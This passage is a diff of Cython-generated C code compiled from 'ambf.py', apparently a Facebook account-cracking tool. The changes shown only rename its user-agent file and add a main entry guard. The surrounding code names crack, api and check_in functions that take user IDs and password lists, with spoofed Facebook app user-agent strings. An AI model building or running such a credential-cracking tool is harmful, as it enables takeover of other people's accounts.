  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
     __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 657, __pyx_L1_error)
@@ -21767,9 +21734,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":658
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
@@ -21803,7 +21770,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":659
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["6", "06"]:
@@ -21813,7 +21780,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":660
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["6", "06"]:
@@ -21843,7 +21810,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["5", "05"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     goto __pyx_L3;
   }
@@ -21853,7 +21820,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["6", "06"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
@@ -21874,7 +21841,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["6", "06"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")             # <<<<<<<<<<<<<<
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  */
     __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Linux_Android_9_CPH1);
@@ -21883,9 +21850,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     /* "ambf.py":663
  * 	elif ua in ["6", "06"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  */
     __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 663, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
@@ -21911,9 +21878,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":664
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
     __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 664, __pyx_L1_error)
@@ -21939,9 +21906,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":665
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
@@ -21975,7 +21942,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":666
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["7", "07"]:
@@ -21985,7 +21952,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":667
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["7", "07"]:
@@ -22015,7 +21982,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["6", "06"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     goto __pyx_L3;
   }
@@ -22059,7 +22026,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		c_ua = input(" [+] user-agent : ")
  * 		if c_ua == "":             # <<<<<<<<<<<<<<
  * 			exit("\n [!] jangan kosong")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     __pyx_t_5 = (__Pyx_PyUnicode_Equals(__pyx_v_c_ua, __pyx_kp_u__12, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 670, __pyx_L1_error)
     if (__pyx_t_5) {
@@ -22068,7 +22035,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		c_ua = input(" [+] user-agent : ")
  * 		if c_ua == "":
  * 			exit("\n [!] jangan kosong")             # <<<<<<<<<<<<<<
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  */
       __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 671, __pyx_L1_error)
@@ -22080,14 +22047,14 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		c_ua = input(" [+] user-agent : ")
  * 		if c_ua == "":             # <<<<<<<<<<<<<<
  * 			exit("\n [!] jangan kosong")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     }
 
     /* "ambf.py":672
  * 		if c_ua == "":
  * 			exit("\n [!] jangan kosong")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		input("\n [+] berhasil ganti user agent")
  */
@@ -22115,7 +22082,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":673
  * 			exit("\n [!] jangan kosong")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
@@ -22143,7 +22110,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":674
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
@@ -26125,6 +26092,7 @@ static PyObject *__pyx_pf_4ambf_44main(CYTHON_UNUSED PyObject *__pyx_self) {
  * 			open(".__apikey__.txt","w").write(key)
  * 			print(" [!] api key terdaftar")             # <<<<<<<<<<<<<<
  * 			return make()
+ * 
  */
         __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__134, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 794, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
@@ -26134,6 +26102,8 @@ static PyObject *__pyx_pf_4ambf_44main(CYTHON_UNUSED PyObject *__pyx_self) {
  * 			open(".__apikey__.txt","w").write(key)
  * 			print(" [!] api key terdaftar")
  * 			return make()             # <<<<<<<<<<<<<<
+ * 
+ * if __name__ == "__main__":
  */
         __Pyx_XDECREF(__pyx_r);
         __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_make); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 795, __pyx_L5_except_error)
@@ -26854,6 +26824,7 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_n_u_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 1, 0, 1},
   {&__pyx_n_u_m_ts, __pyx_k_m_ts, sizeof(__pyx_k_m_ts), 0, 1, 0, 1},
   {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
+  {&__pyx_n_u_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 1, 0, 1},
   {&__pyx_n_s_main_2, __pyx_k_main_2, sizeof(__pyx_k_main_2), 0, 0, 1, 1},
   {&__pyx_n_s_make, __pyx_k_make, sizeof(__pyx_k_make), 0, 0, 1, 1},
   {&__pyx_kp_u_mark_via_gp, __pyx_k_mark_via_gp, sizeof(__pyx_k_mark_via_gp), 0, 1, 0, 0},
@@ -27019,8 +26990,7 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_u_tunggu_sebentar, __pyx_k_tunggu_sebentar, sizeof(__pyx_k_tunggu_sebentar), 0, 1, 0, 0},
   {&__pyx_kp_u_tutorial_cara_mendapatkan_token, __pyx_k_tutorial_cara_mendapatkan_token, sizeof(__pyx_k_tutorial_cara_mendapatkan_token), 0, 1, 0, 0},
   {&__pyx_kp_u_txt, __pyx_k_txt, sizeof(__pyx_k_txt), 0, 1, 0, 0},
-  {&__pyx_kp_u_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 1, 0, 0},
-  {&__pyx_n_s_ua_2, __pyx_k_ua_2, sizeof(__pyx_k_ua_2), 0, 0, 1, 1},
+  {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
   {&__pyx_n_s_uid, __pyx_k_uid, sizeof(__pyx_k_uid), 0, 0, 1, 1},
   {&__pyx_n_u_unrecognized_tries, __pyx_k_unrecognized_tries, sizeof(__pyx_k_unrecognized_tries), 0, 1, 0, 1},
   {&__pyx_n_s_update, __pyx_k_update, sizeof(__pyx_k_update), 0, 0, 1, 1},
@@ -27033,6 +27003,7 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_u_user_agent_2, __pyx_k_user_agent_2, sizeof(__pyx_k_user_agent_2), 0, 1, 0, 0},
   {&__pyx_kp_u_user_agent_s, __pyx_k_user_agent_s, sizeof(__pyx_k_user_agent_s), 0, 1, 0, 0},
   {&__pyx_kp_u_user_aktif_selamat_datang_0_93m, __pyx_k_user_aktif_selamat_datang_0_93m, sizeof(__pyx_k_user_aktif_selamat_datang_0_93m), 0, 1, 0, 0},
+  {&__pyx_kp_u_useragent__txt, __pyx_k_useragent__txt, sizeof(__pyx_k_useragent__txt), 0, 1, 0, 0},
   {&__pyx_n_s_value, __pyx_k_value, sizeof(__pyx_k_value), 0, 0, 1, 1},
   {&__pyx_n_u_value, __pyx_k_value, sizeof(__pyx_k_value), 0, 1, 0, 1},
   {&__pyx_n_u_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 1, 0, 1},
@@ -27965,11 +27936,11 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
   /* "ambf.py":504
  * def api(uid, pwx):
  * 	try:
- * 		ua = open(".ua", "r").read()             # <<<<<<<<<<<<<<
+ * 		ua = open("useragent_.txt", "r").read()             # <<<<<<<<<<<<<<
  * 	except IOError:
  * 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  */
-  __pyx_tuple__92 = PyTuple_Pack(2, __pyx_kp_u_ua, __pyx_n_u_r); if (unlikely(!__pyx_tuple__92)) __PYX_ERR(0, 504, __pyx_L1_error)
+  __pyx_tuple__92 = PyTuple_Pack(2, __pyx_kp_u_useragent__txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__92)) __PYX_ERR(0, 504, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__92);
   __Pyx_GIVEREF(__pyx_tuple__92);
 
@@ -28133,17 +28104,17 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
   /* "ambf.py":628
  * 	elif ua in ["1", "01"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  */
-  __pyx_tuple__114 = PyTuple_Pack(2, __pyx_kp_u_ua, __pyx_n_u_w); if (unlikely(!__pyx_tuple__114)) __PYX_ERR(0, 628, __pyx_L1_error)
+  __pyx_tuple__114 = PyTuple_Pack(2, __pyx_kp_u_useragent__txt, __pyx_n_u_w); if (unlikely(!__pyx_tuple__114)) __PYX_ERR(0, 628, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__114);
   __Pyx_GIVEREF(__pyx_tuple__114);
 
   /* "ambf.py":631
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["2", "02"]:
@@ -28507,9 +28478,9 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  * 
  * def api(uid, pwx):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
-  __pyx_tuple__160 = PyTuple_Pack(15, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_ua_2, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_headers_2, __pyx_n_s_send, __pyx_n_s_kuki, __pyx_n_s_ttl, __pyx_n_s_month, __pyx_n_s_day, __pyx_n_s_year, __pyx_n_s_passx, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__160)) __PYX_ERR(0, 502, __pyx_L1_error)
+  __pyx_tuple__160 = PyTuple_Pack(15, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_ua, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_headers_2, __pyx_n_s_send, __pyx_n_s_kuki, __pyx_n_s_ttl, __pyx_n_s_month, __pyx_n_s_day, __pyx_n_s_year, __pyx_n_s_passx, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__160)) __PYX_ERR(0, 502, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__160);
   __Pyx_GIVEREF(__pyx_tuple__160);
   __pyx_codeobj__161 = (PyObject*)__Pyx_PyCode_New(2, 0, 15, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__160, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_api, 502, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__161)) __PYX_ERR(0, 502, __pyx_L1_error)
@@ -28519,9 +28490,9 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  * 
  * def crack(uid, pwx, host):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
-  __pyx_tuple__162 = PyTuple_Pack(16, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_host, __pyx_n_s_ua_2, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_p, __pyx_n_s_b, __pyx_n_s_kuki, __pyx_n_s_ttl, __pyx_n_s_month, __pyx_n_s_day, __pyx_n_s_year, __pyx_n_s_passx, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__162)) __PYX_ERR(0, 552, __pyx_L1_error)
+  __pyx_tuple__162 = PyTuple_Pack(16, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_host, __pyx_n_s_ua, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_p, __pyx_n_s_b, __pyx_n_s_kuki, __pyx_n_s_ttl, __pyx_n_s_month, __pyx_n_s_day, __pyx_n_s_year, __pyx_n_s_passx, __pyx_n_s_key, __pyx_n_s_value); if (unlikely(!__pyx_tuple__162)) __PYX_ERR(0, 552, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__162);
   __Pyx_GIVEREF(__pyx_tuple__162);
   __pyx_codeobj__163 = (PyObject*)__Pyx_PyCode_New(3, 0, 16, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__162, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_crack, 552, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__163)) __PYX_ERR(0, 552, __pyx_L1_error)
@@ -28551,7 +28522,7 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  * 	print("\n [ pilih user-agent hp anda ]\n")
  * 	print(" [1]. Xiaomi")
  */
-  __pyx_tuple__166 = PyTuple_Pack(2, __pyx_n_s_ua_2, __pyx_n_s_c_ua); if (unlikely(!__pyx_tuple__166)) __PYX_ERR(0, 614, __pyx_L1_error)
+  __pyx_tuple__166 = PyTuple_Pack(2, __pyx_n_s_ua, __pyx_n_s_c_ua); if (unlikely(!__pyx_tuple__166)) __PYX_ERR(0, 614, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__166);
   __Pyx_GIVEREF(__pyx_tuple__166);
   __pyx_codeobj__167 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__166, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_setting_ua, 614, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__167)) __PYX_ERR(0, 614, __pyx_L1_error)
@@ -28587,7 +28558,7 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  * 	mb = ("https://mbasic.facebook.com")
  * 	ua = "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"
  */
-  __pyx_tuple__172 = PyTuple_Pack(25, __pyx_n_s_user, __pyx_n_s_pasw, __pyx_n_s_mb, __pyx_n_s_ua_2, __pyx_n_s_ses, __pyx_n_s_data, __pyx_n_s_ged, __pyx_n_s_fm, __pyx_n_s_list, __pyx_n_s_i, __pyx_n_s_run, __pyx_n_s_kuki, __pyx_n_s_eax, __pyx_n_s_form, __pyx_n_s_dtsg, __pyx_n_s_jzst, __pyx_n_s_nh, __pyx_n_s_dataD, __pyx_n_s_xnxx, __pyx_n_s_ngew, __pyx_n_s_opt, __pyx_n_s_oh, __pyx_n_s_key, __pyx_n_s_value, __pyx_n_s_yy); if (unlikely(!__pyx_tuple__172)) __PYX_ERR(0, 716, __pyx_L1_error)
+  __pyx_tuple__172 = PyTuple_Pack(25, __pyx_n_s_user, __pyx_n_s_pasw, __pyx_n_s_mb, __pyx_n_s_ua, __pyx_n_s_ses, __pyx_n_s_data, __pyx_n_s_ged, __pyx_n_s_fm, __pyx_n_s_list, __pyx_n_s_i, __pyx_n_s_run, __pyx_n_s_kuki, __pyx_n_s_eax, __pyx_n_s_form, __pyx_n_s_dtsg, __pyx_n_s_jzst, __pyx_n_s_nh, __pyx_n_s_dataD, __pyx_n_s_xnxx, __pyx_n_s_ngew, __pyx_n_s_opt, __pyx_n_s_oh, __pyx_n_s_key, __pyx_n_s_value, __pyx_n_s_yy); if (unlikely(!__pyx_tuple__172)) __PYX_ERR(0, 716, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__172);
   __Pyx_GIVEREF(__pyx_tuple__172);
   __pyx_codeobj__173 = (PyObject*)__Pyx_PyCode_New(2, 0, 25, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__172, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ambf_py, __pyx_n_s_check_in, 716, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__173)) __PYX_ERR(0, 716, __pyx_L1_error)
@@ -29821,7 +29792,7 @@ if (!__Pyx_RefNanny) {
  * 
  * def api(uid, pwx):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
   __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_25api, 0, __pyx_n_s_api, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__161)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 502, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
@@ -29833,7 +29804,7 @@ if (!__Pyx_RefNanny) {
  * 
  * def crack(uid, pwx, host):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
   __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_27crack, 0, __pyx_n_s_crack, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__163)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 552, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
@@ -29948,15 +29919,47 @@ if (!__Pyx_RefNanny) {
   if (PyDict_SetItem(__pyx_d, __pyx_n_s_main_2, __pyx_t_2) < 0) __PYX_ERR(0, 777, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
+  /* "ambf.py":797
+ * 			return make()
+ * 
+ * if __name__ == "__main__":             # <<<<<<<<<<<<<<
+ * 	main()
+ */
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_name_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 797, __pyx_L1_error)
+  __Pyx_GOTREF(__pyx_t_2);
+  __pyx_t_6 = (__Pyx_PyUnicode_Equals(__pyx_t_2, __pyx_n_u_main, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 797, __pyx_L1_error)
+  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
+  if (__pyx_t_6) {
+
+    /* "ambf.py":798
+ * 
+ * if __name__ == "__main__":
+ * 	main()             # <<<<<<<<<<<<<<
+ */
+    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_main_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 798, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_2);
+    __pyx_t_9 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 798, __pyx_L1_error)
+    __Pyx_GOTREF(__pyx_t_9);
+    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
+    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
+
+    /* "ambf.py":797
+ * 			return make()
+ * 
+ * if __name__ == "__main__":             # <<<<<<<<<<<<<<
+ * 	main()
+ */
+  }
+
   /* "ambf.py":1
  * # -*- coding: utf-8             # <<<<<<<<<<<<<<
  * import os, sys, re, time, requests, calendar, random, bs4, subprocess
  * from concurrent.futures import ThreadPoolExecutor
  */
-  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)
-  __Pyx_GOTREF(__pyx_t_2);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
-  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
+  __pyx_t_9 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1, __pyx_L1_error)
+  __Pyx_GOTREF(__pyx_t_9);
